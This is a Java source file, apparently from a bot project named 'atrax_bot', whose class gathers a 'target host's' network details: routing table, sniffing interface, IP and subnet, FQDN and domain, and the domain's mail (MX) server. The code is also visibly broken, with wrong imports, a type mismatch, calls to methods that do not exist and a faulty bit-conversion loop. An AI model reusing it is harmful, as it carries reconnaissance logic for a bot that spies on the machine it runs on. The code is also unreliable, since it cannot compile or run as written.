
package atrax_bot;

import com.sun.prism.impl.Disposer.Record;
import java.io.IOException;
import java.lang.ProcessBuilder.Redirect.Type;
import java.lang.invoke.MethodHandles.Lookup;
import jpcap.JpcapCaptor;
import jpcap.NetworkInterface;
import jpcap.NetworkInterfaceAddress;

import org.xbill.DNS.*;

import java.net.InetAddress;
import java.net.UnknownHostException;
/***********************************************************
 * this class:
 *   determines the network parameters of the target host
 *      assumes it is connecting to the main interface
 *      therefore focuses on one interface
 * 
 ***********************************************************/
public class HostNetParams {
    
    /***********************************
     * INITIALIZATION OF OUR VARIABLES
     ***********************************/
    
    // name of the main interface
    String mainInterfaceName;
    
    // IP of the main interface, e.g. 192.168.1.169
    InetAddress mainInterfaceIP;
    
    // subnet mask of the main interface, e.g. 255.255.255.0
    InetAddress mainInterfaceSubnetMask;
    
    // network address of the main interface, e.g. 192.168.1.0
    InetAddress mainInterfaceNetwork;
    
    //default gateway of the host
    String defaultGateway;
    
    // the ID of the main interface 
    int mainInterfaceID;
    
    // the router of the host
    String hostRouter;
    
    // the FQDN of the host
    String hostFQDN;
    
    // the domain name of the host
    String hostDomainName;
    
    /***********************
     * THE MAIN CONSTRUCTOR
     * @throws java.io.IOException
     ***********************/
    public HostNetParams() throws IOException{
        // use netstat -rn to fetch routing info
        hostRouter = tools.runCmd("netstat -rn");
        String[] multiLineRoutes = hostRouter.split("\n");
        String defaultRoute;
        defaultRoute = "";
        
        //find the default gateway line in the array
        for (String multiLineRoute : multiLineRoutes) {
            if (multiLineRoute.substring(0, 7).equals("0.0.0.0")) {
                defaultRoute = multiLineRoute;
            }
        }
        //deduct the name of the main interface from that line
        if (defaultRoute.trim().length() > 0){
            String defaultRouteElements[] = defaultRoute.split("\\s+");
            // set the name, which is the last element in the newly made array
            mainInterfaceName = defaultRouteElements[defaultRouteElements.length - 1];
            defaultGateway = defaultRouteElements[1];
        } else {
            mainInterfaceName = "unknown";
            defaultGateway = "unknown";
        }
        // use jpcap to fetch the interface names
        // then match the name to the ID of that interface
        // the ID is needed when sniffing traffic
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        mainInterfaceID = -1;
        
        for (NetworkInterface device : devices) {
            if (device.name.contains((mainInterfaceName))){
                mainInterfaceID = device;
            }
        }
        // get the IP address from the main interface line
        // also the subnet mask
        int n = 0;
        for (NetworkInterfaceAddress a : devices[mainInterfaceID].addresses){
            if (n == 0){
                mainInterfaceIP = a.address;
                mainInterfaceSubnetMask = a.subnet;
                n++;
            }
        }
        
        // get the network address
         mainInterfaceNetwork = InetAddress.getByName(binaryStringToIP
                            (logicalAND(ipToBinary(mainInterfaceIP.getAddress()),
                                    ipToBinary(mainInterfaceSubnetMask.getAddress()))));
    }
    
    /************************************************
     *this method gets the DNS data about this host
     * the FQDN
     * the domain name
     * @param thePublicIP
     ************************************************/
    public void getDNSdata(InetAddress thePublicIP){
        // find the FQDN
        hostFQDN = thePublicIP.getCanonicalHostName();
        
        // find the domain
        // last 2 parts of the host's FQDN
        // length-2 .net,.com...
        String[] nameParts = hostFQDN.split("\\.");
        hostDomainName = nameParts[nameParts.length-2 ] + "." + 
                nameParts[nameParts.length-1];
    }
    
    /************************************
     * this method:
     *  attempts to find the SMTP server
     *  based on the domain name
     *  where the host resides
     * @param theDomain
     * @return 
     ************************************/
    public String findSMTPserver(String theDomain){
        String SMTPserver = null;
        int preference = 1000;
        
        Record[] records = null;
        try {
            records = new Lookup(theDomain, Type.MX).run();
        } catch (TextParseException e){}
        
        if (records != null) {
            for (Record record : records) {
                MXRecord mx = (MXRecord) record;
                if(mx.getPriority() < preference) {
                    SMTPserver = mx.getTarget().toString();
                    preference = mx.getPriority();
                }
            }
        }
        return SMTPserver;
    }
    /*************************************
     * this method:
     *  takes a binary representation 
     *  of an IP address
     *  and converts it back to decimal
     *************************************/
    private String binaryStringToIP (String theBinaryIP){
        String theResult = "";
        
        if (! (theBinaryIP.length() == 32)){
            return "";
        } else {
            for (int i=0;i<4;i++){
                String octet = theBinaryIP.substring(8*i, 8*i+8);
                int octetValue = Integer.parseInt(octet, 2);
                if (!(i == 0)){
                    theResult += ".";
                }
                theResult += Integer.toString(octetValue);
            }
        }
        return theResult;
    }
    
    /*************************************
     * this method:
     *  takes the byte array
     *      representing the IP number
     *  translates it to a binary number
     *************************************/
    private static String binaryArrayToIP(byte[] IPBytesArray){
        String ipAddress = "";
        
        for (int i=0;i<IPBytesArray.length;i++){
            StringBuilder binaryValue = new StringBuilder("00000000");
            
            for (int bit=0;bit < 8; bit++){
                if( ((IPBytesArray[i] >> 1) & 1) > 0){
                    binaryValue.setCharAt(7-bit, '1');
                }
            }
            ipAddress += binaryValue;
        }
        return ipAddress;
    }
    
    /*******************************
     * this method:
     *  performs a logical &&(AND)
     *  on two binary strings
     *******************************/
    private String logicalANDComparison(String first_str, String second_str){
        String theResult = "";
        
        if( ! (first_str.length() == second_str.length()) ){
            return "";
        } else {
            for (int i=0;i < first_str.length();i++){
                if ("1".equals(first_str.substring(i, i+1)) && "1".equals(second_str.substring(i, i+1))) {
                    theResult += "1";
                } else {
                    theResult += "0";
                }
            }
        }
        return theResult;
    }
    
    /**************************************
     * this method:
     *  translates the host's subnet mask
     *  to it's CIDR notation
     * @param theSubMask
     * @return 
     **************************************/
    public static String toCIDR(InetAddress theSubMask){
        String subMaskString = binaryArrayToIP(theSubMask.getAddress());
        return "/" + subMaskString.replace("0", "").trim().length();
    }
}